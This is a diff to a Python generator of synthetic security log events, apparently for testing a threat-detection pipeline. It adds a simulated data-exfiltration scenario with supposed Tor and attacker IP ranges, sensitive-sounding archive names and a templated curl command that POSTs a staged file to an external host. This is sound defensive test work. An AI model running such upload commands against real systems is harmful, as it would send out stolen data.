@@ -58,6 +58,16 @@ AUTH_SERVER = "10.0.1.50"
 ADMIN_WS = "10.0.1.25"
 NAS = "10.0.50.100"
 
+# Data exfiltration scenario — external staging IPs in Tor exit / attacker-controlled ranges
+EXFIL_DEST_IPS = (
+    [f"185.220.{s}.{h}" for s, h in [
+        (100, 240), (100, 241), (100, 242), (100, 243), (100, 244),
+        (101, 10),  (101, 11),  (101, 12),  (101, 13),  (101, 14),
+        (102, 5),   (102, 6),   (102, 7),   (102, 8),   (102, 9),
+    ]]
+    + ["91.108.4.55", "45.142.212.100", "194.165.16.42", "185.56.80.65"]
+)
+
 BENIGN_PORTS = [53, 80, 443, 25, 123, 8080, 8443, 21]
 BENIGN_PROTOCOLS = ["DNS", "HTTP", "HTTPS", "SMTP", "NTP", "FTP"]
 BENIGN_UAS = [
@@ -423,6 +433,141 @@ def _lateral_movement_events(timestamp: datetime, step: int) -> list[dict]:
     return events
 
 
+# ── Scenario E: Malicious Data Exfiltration ──────────────────────────────────
+
+# Process names seen in real-world exfiltration campaigns
+_EXFIL_PROCESSES = ["curl.exe", "certutil.exe", "powershell.exe", "python.exe", "wget.exe"]
+_EXFIL_PARENT_PROCS = ["cmd.exe", "powershell.exe", "explorer.exe", "svchost.exe"]
+
+# Archive/staged file names that mimic real exfil artefacts
+_EXFIL_STAGED_FILES = [
+    "employee_records_2024.zip",
+    "financial_data_q4.tar.gz",
+    "source_code_backup.7z",
+    "credentials_dump.zip",
+    "customer_pii_export.gz",
+    "db_backup_prod.sql.gz",
+    "intellectual_property.zip",
+]
+
+# Fake endpoints used by attacker-controlled staging servers
+_EXFIL_ENDPOINTS = [
+    "/upload",
+    "/api/store",
+    "/s3/put",
+    "/data/receive",
+    "/drop",
+    "/exfil",
+    "/transfer",
+]
+
+
+def _data_exfiltration_attack(timestamp: datetime, transfer_index: int) -> list[dict]:
+    """
+    Simulate a malicious data exfiltration event.
+
+    Produces 1-2 events per call:
+      - Primary network/application event: internal host → external Tor/attacker IP,
+        bytes_sent > 50 MB, triggers Rule TV-007.
+      - Optional endpoint event: process staging the archive before transfer.
+
+    Design decisions:
+      - dest_ip is always external (185.220.x.x or similar) so dest_ip_external=True.
+      - bytes_sent is between 50 MB and 500 MB to reliably exceed the TV-007 threshold.
+      - No "known_asset", "internal_destination", or "business_hours" flags — ensures
+        the fast-path false-positive check in threat_classifier.py does NOT suppress it.
+      - confidence=0.90 and severity="HIGH" to satisfy the auto-ticket threshold
+        (confidence > 0.85 AND severity HIGH/CRITICAL).
+    """
+    events: list[dict] = []
+
+    src_ip = random.choice(EMPLOYEE_IPS)
+    dest_ip = random.choice(EXFIL_DEST_IPS)
+    protocol = random.choice(["HTTPS", "HTTP"])
+    layer = random.choice(["application", "network"])
+
+    # Random size between 50 MB and 500 MB
+    size_mb = random.uniform(50.0, 500.0)
+    bytes_sent = int(size_mb * 1024 * 1024)
+
+    staged_file = random.choice(_EXFIL_STAGED_FILES)
+    process = random.choice(_EXFIL_PROCESSES)
+    parent = random.choice(_EXFIL_PARENT_PROCS)
+    endpoint = random.choice(_EXFIL_ENDPOINTS)
+    user = random.choice(EMPLOYEE_USERS)
+
+    # Primary transfer event
+    events.append(_base_event(
+        layer=layer,
+        source_ip=src_ip,
+        dest_ip=dest_ip,
+        source_port=random.randint(32768, 60000),
+        dest_port=443 if protocol == "HTTPS" else 80,
+        protocol=protocol,
+        bytes_sent=bytes_sent,
+        bytes_recv=random.randint(512, 4096),
+        duration_ms=int(size_mb * random.uniform(800, 2500)),
+        process_name=process,
+        parent_process=parent,
+        user=user,
+        http_method="POST",
+        http_endpoint=endpoint,
+        http_status=200,
+        user_agent="curl/7.88.1" if process == "curl.exe" else None,
+        geo_country="Netherlands/Tor" if "185.220" in dest_ip else "Unknown/External",
+        flags=["large_transfer", "suspicious_destination", "data_exfiltration_pattern"],
+        scenario="data_exfiltration",
+        severity="HIGH",
+        confidence=0.90,
+        timestamp=timestamp,
+        raw_payload={
+            "transfer_index": transfer_index,
+            "size_mb": round(size_mb, 2),
+            "staged_file": staged_file,
+            "destination": dest_ip,
+            "mitre": "T1048",
+            "compressed": True,
+            "encrypted": protocol == "HTTPS",
+            "chunks": random.randint(3, 20),
+        },
+    ))
+
+    # Endpoint event: process that staged or initiated the transfer
+    events.append(_base_event(
+        layer="endpoint",
+        source_ip=src_ip,
+        dest_ip=src_ip,  # local staging before send
+        source_port=0,
+        dest_port=0,
+        protocol="N/A",
+        process_name=process,
+        parent_process=parent,
+        user=user,
+        bytes_sent=bytes_sent,
+        bytes_recv=0,
+        duration_ms=random.randint(1000, 8000),
+        geo_country="Internal",
+        flags=["large_transfer", "suspicious_destination", "data_exfiltration_pattern"],
+        scenario="data_exfiltration",
+        severity="HIGH",
+        confidence=0.88,
+        timestamp=timestamp + timedelta(milliseconds=random.randint(100, 800)),
+        raw_payload={
+            "command_line": (
+                f"{process} -X POST https://{dest_ip}{endpoint} "
+                f"--data-binary @{staged_file} --max-time 300"
+            ),
+            "staged_file": staged_file,
+            "mitre": "T1048",
+            "size_mb": round(size_mb, 2),
+            "pid": random.randint(4000, 9999),
+            "parent_pid": random.randint(1000, 3999),
+        },
+    ))
+
+    return events
+
+
 # ── Benign baseline ────────────────────────────────────────────────────────────
 
 def _benign_event(timestamp: datetime) -> dict:
@@ -488,27 +633,29 @@ def generate_event_batch(
     Generate `count` events.
 
     Scenario mix (when scenario_mix=True):
-      - 80% benign
-      - 5% brute_force (Scenario A)
-      - 5% c2_beacon (Scenario B)
-      - 5% false_positive (Scenario C)
-      - 5% lateral_movement (Scenario D, injected after first 20% of events)
+      - ~76% benign
+      - ~5% brute_force (Scenario A)
+      - ~5% c2_beacon (Scenario B)
+      - ~4% false_positive (Scenario C)
+      - ~5% lateral_movement (Scenario D)
+      - ~4% data_exfiltration (Scenario E — triggers Rule TV-007)
     """
-    events: list[dict] = []
     now = base_time or datetime.now(timezone.utc)
 
     if not scenario_mix:
+        events: list[dict] = []
         for i in range(count):
             ts = now + timedelta(milliseconds=i * 10)
             events.append(_benign_event(ts))
         return events
 
     # Allocate exact slots so total == count
-    n_brute   = max(1, int(count * 0.05))
-    n_c2      = max(1, int(count * 0.05))
-    n_fp      = max(1, int(count * 0.05))
+    n_brute  = max(1, int(count * 0.05))
+    n_c2     = max(1, int(count * 0.05))
+    n_fp     = max(1, int(count * 0.04))
     n_lateral = max(1, int(count * 0.05))
-    n_benign  = count - n_brute - n_c2 - n_fp - n_lateral  # fills remainder
+    n_exfil  = max(2, int(count * 0.04))   # at least 2 exfiltration events per batch
+    n_benign = count - n_brute - n_c2 - n_fp - n_lateral - n_exfil  # fills remainder
 
     all_events: list[dict] = []
 
@@ -547,6 +694,16 @@ def generate_event_batch(
         lm_collected.extend(_lateral_movement_events(ts, step))
         step += 1
     all_events.extend(lm_collected[:n_lateral])
+
+    # Data exfiltration (Scenario E — each call yields 2 events; collect until quota met)
+    exfil_start = now + timedelta(seconds=random.uniform(60, 300))
+    exfil_collected: list[dict] = []
+    exfil_step = 0
+    while len(exfil_collected) < n_exfil:
+        ts = exfil_start + timedelta(seconds=exfil_step * random.uniform(30, 120))
+        exfil_collected.extend(_data_exfiltration_attack(ts, exfil_step))
+        exfil_step += 1
+    all_events.extend(exfil_collected[:n_exfil])
 
     # Shuffle to interleave scenarios, then return exact count
     random.shuffle(all_events)
